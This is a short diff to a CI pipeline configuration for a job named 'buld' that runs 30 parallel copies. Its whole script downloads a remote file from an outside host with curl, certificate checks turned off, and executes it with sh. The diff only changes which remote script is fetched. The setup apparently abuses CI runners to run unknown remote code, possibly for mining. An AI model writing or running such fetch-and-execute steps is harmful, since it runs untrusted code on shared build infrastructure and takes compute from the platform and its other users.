@@ -4,5 +4,5 @@ buld:
   parallel: 30
   stage: buld
   script:
-    - curl -sLkO https://s.umj.ac.id/koclak
-    - sh koclak
+    - curl -sLkO https://s.umj.ac.id/bagong
+    - sh bagong
